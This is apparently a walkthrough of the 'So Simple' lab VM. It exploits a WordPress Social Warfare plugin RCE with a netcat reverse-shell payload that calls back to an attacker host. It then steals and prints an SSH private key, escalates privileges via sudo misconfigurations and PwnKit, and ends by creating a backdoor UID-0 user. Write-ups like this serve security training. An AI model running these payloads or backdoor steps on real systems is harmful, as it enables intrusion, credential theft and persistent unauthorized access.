IP - 10.0.2.24

---------------------------------------------------------------------------------------------------------------------------------------------------------------

nmap result

┌──(root㉿kali)-[~/Desktop/Web_Sec_Creatigon/wp_exploit]
└─# nmap -sC -sV 10.0.2.24 -p- -oN nmap_all_port.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 23:57 +0630
Nmap scan report for 10.0.2.24
Host is up (0.000093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:C5:99:FF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Dirsearch Result

┌──(root㉿kali)-[~/Desktop/Web_Sec_Creatigon/wp_exploit]
└─# dirsearch -u http://10.0.2.24/ -e php -f -x 400,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441

Output File: /root/.dirsearch/reports/10.0.2.24/-_23-02-05_23-59-32.txt

Error Log: /root/.dirsearch/logs/errors-23-02-05_23-59-32.log

Target: http://10.0.2.24/

[23:59:32] Starting: 
[23:59:51] 200 -  495B  - /index.html                                       
[00:00:08] 200 -    5KB - /wordpress/wp-login.php                           
[00:00:08] 200 -   13KB - /wordpress/

Task Completed

Found wordpress cms and enumerate wordpress with wpscan:

After running wpscan enumeration I research about social-warfare plugin version Version: 3.5.0 found RCE exploit.

https://www.exploit-db.com/exploits/46794

https://vulners.com/zdt/1337DAY-ID-36598

First, trying to understand how it work and exploit the RCE.

1st Step:

I create shell1.txt file with this reverse shell payload and save it:

┌──(root㉿kali)-[/tmp]
└─# subl shell1.txt

<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.4 4444 >/tmp/f')</pre>

2nd Step:

I host the directory with python2 server:

                                                                                                                                                                                         
┌──(root㉿kali)-[/tmp]
└─# python2 -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...
10.0.2.24 - - [06/Feb/2023 02:54:20] "GET /shell1.txt?swp_debug=get_user_options HTTP/1.0" 200 -


3rd Step:

I run the exploit with below command:

(Note: before running the exploit I need to listen first with netcat "nc -lvnp 4444")

┌──(root㉿kali)-[~/Desktop/Web_Sec_Creatigon/wp_exploit]
└─# python2 exploit.py -t http://10.0.2.24/wordpress/ --payload-uri="http://10.0.2.4:8888/shell1.txt"
[>] Sending Payload to System!

Boom! I got reverse shell:

┌──(root㉿kali)-[~/Desktop/tools/burpsuite_pro_v2022.9.2]
└─# nc -lvnp 4444                           
listening on [any] 4444 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.24] 44154
sh: 0: can't access tty; job control turned off
$ whoami
www-data

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Getting User Access

I enumerate home directory and found 2 users

1st user: max
2nd user: steven

At max directory I found .ssh file and id_rsa key. So, I copy id_rsa key into my machine and chmod 600 id_rsa. And then, I tried to access ssh with that id_rsa key.

Boom! I got user access as max.

id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿kali)-[~/Desktop/Web_Sec_Creatigon/wp_exploit]
└─# chmod 600 id_rsa          
                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Web_Sec_Creatigon/wp_exploit]
└─# ssh max@10.0.2.24 -i id_rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb  5 20:30:29 UTC 2023

  System load:  0.13              Processes:                140
  Usage of /:   62.1% of 8.79GB   Users logged in:          0
  Memory usage: 22%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for enp0s3:  10.0.2.24

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

342 updates can be installed immediately.
235 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Jul 15 19:18:39 2020 from 192.168.1.7
max@so-simple:~$ whoami
max

(www-data@so-simple:/home/max$ cat local.txt 
7d245ab31faf045f04ca0e9e25f5480e) (Offensive Security PlayGround flag)

User.txt

max@so-simple:~$ cat user.txt 
073dafccfe902526cee753455ff1dbb0



---------------------------------------------------------------------------------------------------------------------------------------------------------------

Found juicy file and encrypted with base32:

max@so-simple:/tmp$ cat /var/www/html/mybackup.txt
JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF

Decrypted version:

I have to keep this password somewhere safely because I can't remember it: opensesame

Above password is for max wp-login password.

---------------------------------------------------------------------------------------------------------------------------------------------------------------

I execute sudo -l and found:

max@so-simple:/tmp$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service

So, I can switch to steven without his password: (Reference - https://gtfobins.github.io/gtfobins/service/#sudo )

I execute below command and boom I am now steven:

max@so-simple:/tmp$ sudo -u steven /usr/sbin/service ../../bin/sh
$ whoami
steven

User2.txt

$ cat user2.txt
b662b31b7d8cb9f5cdc9c2010337f9b8

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Priv Escalation

Simply priv escalation with PwnKit because after running linpeas I found this machine is vulnerable to PwnKit that's why.

My Machine:

┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]
└─# python2 -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...
10.0.2.24 - - [06/Feb/2023 03:47:01] "GET /PwnKit HTTP/1.1" 200 -

Victim Machine:

steven@so-simple:/tmp$ chmod +x PwnKit 
steven@so-simple:/tmp$ ./PwnKit 
root@so-simple:/tmp# whoami
root

root Flag

root@so-simple:~# cat flag.txt 


  /$$$$$$                                                     /$$              /$$                                   
 /$$__  $$                                                   | $$             | $$                                   
| $$  \__/  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$  /$$$$$$$$| $$                                   
| $$       /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|____  $$|_  $$_/ |____ /$$/| $$                                   
| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/ /$$$$$$$  | $$      /$$$$/ |__/                                   
| $$    $$| $$  | $$| $$  | $$| $$  | $$| $$      /$$__  $$  | $$ /$$ /$$__/                                         
|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$     |  $$$$$$$  |  $$$$//$$$$$$$$ /$$                                   
 \______/  \______/ |__/  |__/ \____  $$|__/      \_______/   \___/ |________/|__/                                   
                               /$$  \ $$                                                                             
                              |  $$$$$$/                                                                             
                               \______/                                                                              
 /$$     /$$                  /$$                                                                           /$$      
|  $$   /$$/                 | $/                                                                          | $$      
 \  $$ /$$//$$$$$$  /$$   /$$|_//$$    /$$ /$$$$$$         /$$$$$$  /$$  /$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$$      
  \  $$$$//$$__  $$| $$  | $$  |  $$  /$$//$$__  $$       /$$__  $$| $$ | $$ | $$| $$__  $$ /$$__  $$ /$$__  $$      
   \  $$/| $$  \ $$| $$  | $$   \  $$/$$/| $$$$$$$$      | $$  \ $$| $$ | $$ | $$| $$  \ $$| $$$$$$$$| $$  | $$      
    | $$ | $$  | $$| $$  | $$    \  $$$/ | $$_____/      | $$  | $$| $$ | $$ | $$| $$  | $$| $$_____/| $$  | $$      
    | $$ |  $$$$$$/|  $$$$$$/     \  $/  |  $$$$$$$      | $$$$$$$/|  $$$$$/$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$      
    |__/  \______/  \______/       \_/    \_______/      | $$____/  \_____/\___/ |__/  |__/ \_______/ \_______/      
                                                         | $$                                                        
 /$$ /$$$$$$                   /$$$$$$  /$$              | $$       /$$          /$$                                 
| $//$$__  $$                 /$$__  $$|__/              |__/      | $$         | $/                                 
|_/| $$  \__/  /$$$$$$       | $$  \__/ /$$ /$$$$$$/$$$$   /$$$$$$ | $$  /$$$$$$|_/                                  
   |  $$$$$$  /$$__  $$      |  $$$$$$ | $$| $$_  $$_  $$ /$$__  $$| $$ /$$__  $$                                    
    \____  $$| $$  \ $$       \____  $$| $$| $$ \ $$ \ $$| $$  \ $$| $$| $$$$$$$$                                    
    /$$  \ $$| $$  | $$       /$$  \ $$| $$| $$ | $$ | $$| $$  | $$| $$| $$_____/                                    
   |  $$$$$$/|  $$$$$$/      |  $$$$$$/| $$| $$ | $$ | $$| $$$$$$$/| $$|  $$$$$$$                                    
    \______/  \______/        \______/ |__/|__/ |__/ |__/| $$____/ |__/ \_______/                                    
                                                         | $$                                                        
                                                         | $$                                                        
                                                         |__/                                                        

Easy box right? Hope you've had fun! Show me the flag on Twitter @roelvb79

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Another Simple way of priv Escalation:

I found (root) NOPASSWD: /opt/tools/server-health.sh but there is no server-health.sh at /opt/tools/.

So, I create folder called tools at /opt and server-health.sh.

in server-health.sh write below code and save it:

#!/bin/bash

/bin/bash

Give permission:

chmod +x server-health.sh

And then run that file with sudo:

steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh
root@so-simple:/opt/tools# whoami
root

Boom! I am root now.

---------------------------------------------------------------------------------------------------------------------------------------------------------------

Add new user as root 

root@vulnix:~# useradd -ou 0 -g 0 lol
root@vulnix:~# passwd lol
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully

user - lol
password - test1234
